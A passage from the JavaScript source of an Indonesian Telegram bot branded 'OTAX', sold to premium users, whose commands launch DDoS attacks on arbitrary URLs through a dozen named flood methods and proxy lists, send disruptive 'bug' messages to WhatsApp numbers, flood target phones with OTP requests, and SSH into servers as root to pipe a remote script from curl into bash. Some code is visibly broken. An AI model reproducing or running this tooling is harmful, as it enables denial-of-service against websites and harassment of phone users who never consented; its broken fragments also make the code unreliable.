✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 20; i++) {   
     
  }
 console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/^\/O-Clear\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; 
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await otax.sendMessage(target, { 
                text: "𝙊𝙏𝘼𝙓 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝙊𝙩𝙖𝙓𝙭𝙭 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Otax!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

// ddos case OTAX
let attackProcesses = {};

async function handleAttackCommand(chatId, args) {
    if (args.length < 3) {
       bot.sendMessage(chatId, `Contoh: /O-Attack <target> <duration> <methods>\nattack https://google.com 120 flood`);  
        return; 
    }

    const [target, duration, methods] = args;

    try {
        const parsing = new URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`); 
         const result = scrape.data;

        console.clear(); 

        const metode = path.join(__dirname, `/otaxddos/${methods}`);

        function pushOngoing (target, methods, duration){
            console.log(`${target} ${methods} ${duration}`)
        }
        let process;

        if (methods === 'flood') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration} 100 10`);
            bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘧𝘭𝘰𝘰𝘥
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});      
} else if (methods === 'tls') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration} 100 10`);
            bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘵𝘭𝘴
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
} else if (methods === 'vip') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration}`);
           bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘷𝘪𝘱
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
 } else if (methods === 'strike') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`);
            bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘴𝘵𝘳𝘪𝘬𝘦
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
     }  else if (methods === 'bypass') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
             bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘣𝘺𝘱𝘢𝘴𝘴
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
}); 
        }  else if (methods === 'storm') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘴𝘵𝘰𝘳𝘮
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'kill') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘬𝘪𝘭𝘭
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'cas') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘤𝘢𝘴
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        } else if (methods === 'pidoras') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘱𝘪𝘥𝘰𝘳𝘢𝘴
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'tlsvip') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘵𝘭𝘴𝘷𝘪𝘱
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'glory') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘨𝘭𝘰𝘳𝘺
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        } else if (methods === 'h2-flash') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘩2-𝘧𝘭𝘢𝘴𝘩
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        } else if (methods === 'h2-flood') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝘖𝘵𝘢𝘹 𝘋𝘥𝘰𝘴 ! ✘
♛ цель  : ${target}
♛ метод : 𝘩2-𝘧𝘭𝘰𝘰𝘥
♛ статус : ${duration} 
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓 ✘....
\`\`\``,
    parse_mode: "Markdown"
});
        }  else {
             bot.sendMessage('Metode serangan tidak valid.');
             return
        } 
	    
          if (!attackProcesses[target]) {
             attackProcesses[target] = {};
          }
          attackProcesses[target][chatId] = process;

        process.on('exit', (code) => {
            console.log(`Proses selesai dengan kode: ${code}`);
             bot.sendMessage(
                 `Attack selesai | Code: ${code}`,  
                {
                    chat_id: chatId,
                    message_id:  messageIdToEdit, 
                   });
            
                delete attackProcesses[target][chatId];  
                 if (Object.keys(attackProcesses[target]).length === 0) {
                         delete attackProcesses[target]; 
                   }
        });
         
          process.stderr.on('data', (data) => {
              console.error(`stderr: ${data}`);
             
               bot.sendMessage(chatId, `Error: ${data}`);
          });
    } catch (error) {
       console.error('Terjadi kesalahan:', error);
       	bot.sendMessage(chatId, `Terjadi kesalahan: ${error.message}`);

    }
}

bot.onText(/\/O-Attack (.+)/, (msg, match) => {       
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; 
    const args = match[1].split(' '); 
    
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    handleAttackCommand(chatId, args);  
});
// track ip
async function trackIP(msg, args) {
    const chatId = msg.chat.id;

    if (args.length < 1) {
        const message = `Contoh: \`/trackip <ip address>\`\n/trackip 1.1.1.1`;
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }); 
        sigma();
        return;
    }

    const [target] = args;

    if (target === '0.0.0.0') {
        bot.sendMessage(chatId, 'Jangan Di Ulangi Manis Nanti Di Delete User Mu');
        sigma();
        return;
    }

    try {
        const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696'; 
        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
        const res = await fetch(`https://ipwho.is/${target}`);

        if (!response.ok || !res.ok) {
            throw new Error(`Gagal mengambil data IP. Status: ${response.status} or ${res.status}`);
        }

        const additionalInfo = await res.json();
        const ipInfo = await response.json();

        
        if (!ipInfo || typeof ipInfo !== 'object' || Object.keys(ipInfo).length === 0) {
             throw new Error('Data dari api.ipgeolocation.io tidak valid.');
        }
        if (!additionalInfo || typeof additionalInfo !== 'object' || Object.keys(additionalInfo).length === 0) {
            throw new Error('Data dari ipwho.is tidak valid');
        }

        const message = `Informasi IP untuk ${target}:\n` +
            `- Flags: ${ipInfo.country_flag || 'N/A'}\n` + 
           `- Country: ${ipInfo.country_name || 'N/A'}\n` +
            `- Capital: ${ipInfo.country_capital || 'N/A'}\n` +
            `- City: ${ipInfo.city || 'N/A'}\n` +
           `- ISP: ${ipInfo.isp || 'N/A'}\n` +
            `- Organization: ${ipInfo.organization || 'N/A'}\n` +
            `- Latitude: ${ipInfo.latitude || 'N/A'}\n` +
            `- Longitude: ${ipInfo.longitude || 'N/A'}\n\n` +
            `Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude || ''}+${additionalInfo.longitude || ''}`;


        bot.sendMessage(chatId, message);
        
    } catch (error) {
        console.error(`Error melacak ${target}:`, error);
        bot.sendMessage(chatId, `Error melacak ${target}.  Silakan coba lagi nanti.  Error: ${error.message}`);  
        sigma();
    }
}

bot.onText(/\/trackip (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; ;
    const args = match[1].split(' ');
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    trackIP(msg, args);
    bot.sendMessage(chatId, 'Bot siap digunakan.  Ketik /trackip <ip address> untuk melacak IP.');
});
// Kill Otp Number By Otax
async function killOTP(msg, args) {
    const chatId = msg.chat.id;

    if (args.length < 2) {
        const message = `Contoh: \`/killotp <target> <duration>\`\n/killotp 628xxx 120`; // Format perintah
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }); // Gunakan Markdown untuk formatting
        sigma();
        return;
    }

    const [target, duration] = args;

    if (isNaN(duration) || parseInt(duration) <= 0) {
        bot.sendMessage(chatId, 'Durasi harus berupa angka positif.');
        sigma();
        return;
    }

    try {
        const messageBefore = `Target   : ${target}\nDuration : ${duration}\n\nMencoba meminta kode OTP.`; // Perbarui pesan
        bot.sendMessage(chatId, messageBefore);

        // Ubah path agar lebih relatif dan aman.
        const filePath = path.resolve(__dirname, 'otaxddos', 'Temp.js'); // Gunakan path.resolve
        // Perintah yang akan dieksekusi.  Perhatikan tanda kutip.
        const command = `node "${filePath}" "${target}" "${duration}"`;
        console.log(`Menjalankan perintah: ${command}`); // Logging perintah untuk debugging

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error menjalankan killOTP: ${error}`);
                bot.sendMessage(chatId, `Terjadi kesalahan saat mencoba meminta kode OTP.  Periksa log bot.`); // Pesan yang lebih informatif
                // Tambahkan informasi lebih detail. Apakah error kode atau lainnya?
                if (error.code) {
                    bot.sendMessage(chatId, `Kode error: ${error.code}`);
                }
            } else {
                console.log(`killOTP berhasil (seharusnya).  Target: ${target}, Durasi: ${duration}`);
                bot.sendMessage(chatId, `Permintaan kode OTP berhasil (semoga saja!). Periksa ponsel Anda.`); // Pesan yang baik
            }
            // Opsional:
            if (stdout) console.log('stdout:', stdout);
            if (stderr) console.error('stderr:', stderr);
            sigma();
        }); // exec
    } catch (error) {
        console.error('Kesalahan dalam handler killOTP:', error);
        bot.sendMessage(chatId, 'Terjadi kesalahan internal saat mencoba meminta kode OTP.  Silakan coba lagi nanti.');
        sigma();
    }
}

bot.onText(/\/killotp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; 
    const args = match[1].split(' ');
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    killOTP(msg, args);
});

// tools ambil github
const execAsync = util.promisify(exec);

bot.onText(/^(\/github)\s+(.*)/i, async (m, match) => {
  const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; 
    const args = match[1].split(' ');  
    const repoURL = match[2]; // Dapatkan URL repositori GitHub

    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (!repoURL) {
            return bot.sendMessage(chatId, 'Mohon berikan URL repositori GitHub!', { reply_to_message_id: msg.message_id });
        }
        if (!repoURL.startsWith('https://github.com/')) {
            return bot.sendMessage(chatId, 'URL repositori tidak valid.', { reply_to_message_id: msg.message_id });
        }

        const chatId = chatId;
        const repoName = repoURL.split('/').slice(-1)[0];
        const toolDirectory = path.join(__dirname, 'github_tools', repoName);

        // 1. Unduh Repositori
        await bot.sendChatAction(chatId, 'typing'); // Menunjukkan sedang mengetik

        try {
            if (!fs.existsSync(toolDirectory)) {
                fs.mkdirSync(toolDirectory, { recursive: true });
            }
            await execAsync(`git clone ${repoURL} ${toolDirectory}`);
            await bot.sendMessage(chatId, `Mengunduh alat dari ${repoURL}...`, { reply_to_message_id: msg.message_id });

        } catch (cloneError) {
            console.error('Kesalahan saat mengunduh:', cloneError);
            return bot.sendMessage(chatId, `Gagal mengunduh alat.  ${cloneError.message}`, { reply_to_message_id: msg.message_id });
        }

        // 2. Kirim Berkas
        try {
            const files = await fs.promises.readdir(toolDirectory);

            if (files.length === 0) {
                await bot.sendMessage(chatId, `Tidak ada berkas yang ditemukan di ${repoName}.`, { reply_to_message_id: msg.message_id });
                // Hapus direktori jika tidak ada berkas
                try {
                    await fs.rm(toolDirectory, { recursive: true, force: true });
                    console.log(`Direktori kosong dihapus: ${toolDirectory}`);
                } catch (rmError) {
                    console.error('Gagal menghapus direktori kosong:', rmError);
                }
                return;
            }

            for (const file of files) {
                const filePath = path.join(toolDirectory, file);
                const fileStat = await fs.promises.stat(filePath);

                if (fileStat.isFile()) {
                    try {
                        if (file.endsWith('.png') || file.endsWith('.jpg') || file.endsWith('.jpeg') || file.endsWith('.gif')) {
                            await bot.sendPhoto(chatId, filePath, { caption: `Berkas: ${file}`, reply_to_message_id: msg.message_id });
                        } else {
                            await bot.sendDocument(chatId, fs.createReadStream(filePath), { filename: file, reply_to_message_id: msg.message_id });
                        }
                    } catch (sendError) {
                        
                        await bot.sendMessage(chatId, `Gagal mengirim berkas: ${file}`, { reply_to_message_id: msg.message_id });
                    }
                }
            }
            await bot.sendMessage(chatId, 'Selesai mengirim semua berkas.', { reply_to_message_id: msg.message_id });
        } catch (readDirError) {
            c
            await bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses berkas.', { reply_to_message_id: msg.message_id });
        }

        // 3. Hapus Repositori
        try {
            await fs.rm(toolDirectory, { recursive: true, force: true });
           
        } catch (rmError) {
            
            await bot.sendMessage(chatId, 'Gagal menghapus repositori. Silakan hapus secara manual.', { reply_to_message_id: msg.message_id });
        }

    } catch (err) {
        console.error('Terjadi kesalahan secara keseluruhan: ', err);
        return bot.sendMessage(chatId, 'Terjadi kesalahan secara keseluruhan saat memproses permintaan.', { reply_to_message_id: msg.message_id });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//INSTALL PANEL 2
bot.onText(/^(\.|\#|\/)installpanel$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵!\n𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: /𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗽𝗮𝗻𝗲𝗹2 𝗶𝗽𝘃𝗽𝘀,𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘃𝗽𝘀,𝗱𝗼𝗺𝗮𝗶𝗻𝗽𝗻𝗹,𝗱𝗼𝗺𝗮𝗶𝗻𝗻𝗼𝗱𝗲,𝟭𝟲𝟬𝟬𝟬𝟬𝟬𝟬`);
  });

bot.onText(/\/installpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
const text = match[1];
const userId = msg.from.id;
  const t = text.split(',');
  
      if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
  }

  if (t.length < 3) {
    return bot.sendMessage(chatId, '𝗙𝗼𝗿𝗺𝗮𝘁 𝘀𝗮𝗹𝗮𝗵!\n𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻: /𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗽𝗮𝗻𝗲𝗹2 𝗶𝗽𝘃𝗽𝘀,𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘃𝗽𝘀,𝗱𝗼𝗺𝗮𝗶𝗻𝗽𝗻𝗹,𝗱𝗼𝗺𝗮𝗶𝗻𝗻𝗼𝗱𝗲,𝗿𝗮𝗺𝘃𝗽𝘀 ( ᴄᴏɴᴛᴏʜ : 𝟾𝟶𝟶𝟶 = ʀᴀᴍ 𝟾');
  }

  const ipvps = t[0];
  const passwd = t[1];
  const subdomain = t[2];
  const domainnode = t[3];
  const ramvps = t[4];

  
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };

  const password = generateRandomPassword();
  const command = 'bash <(curl -s https://pterodactyl-installer.se)';
  const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
  const conn = new Client();

  conn.on('ready', () => {
    bot.sendMessage(chatId, '𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗦𝗘𝗗𝗔𝗡𝗚 𝗕𝗘𝗥𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝟱-𝟭𝟬𝗠𝗘𝗡𝗜𝗧');
    
    conn.exec(command, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '𝗧𝗲𝗿𝗷𝗮𝗱𝗶 𝗸𝗲𝘀𝗮𝗹𝗮𝗵𝗮𝗻 𝘀𝗮𝗮𝘁 𝗺𝗲𝗻𝗷𝗮𝗹𝗮𝗻𝗸𝗮𝗻 𝗽𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝗶𝗻𝘀𝘁𝗮𝗹𝗮𝘀𝗶.');
        conn.end();
        return;
      }

      stream.on('close', (code, signal) => {
        console.log(`Stream closed with code ${code} and signal ${signal}`);
        installWings(conn, domainnode, subdomain, password, ramvps);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }).on('error', (err) => {
    // Tangani error jika koneksi gagal
    if (err.message.includes('All configured authentication methods failed')) {
      bot.sendMessage(chatId, 'Koneksi gagal: Kata sandi salah atau VPS tidak dapat diakses.');
    } else if (err.message.includes('connect ECONNREFUSED')) {
      bot.sendMessage(chatId, 'Koneksi gagal: VPS tidak bisa diakses atau mati.');
    } else {
      bot.sendMessage(chatId, `Koneksi gagal: ${err.message}`);
    }
    console.error('Connection Error: ', err.message);
  }).connect(connSettings);
  
  async function installWings(conn, domainnode, subdomain, password, ramvps) {
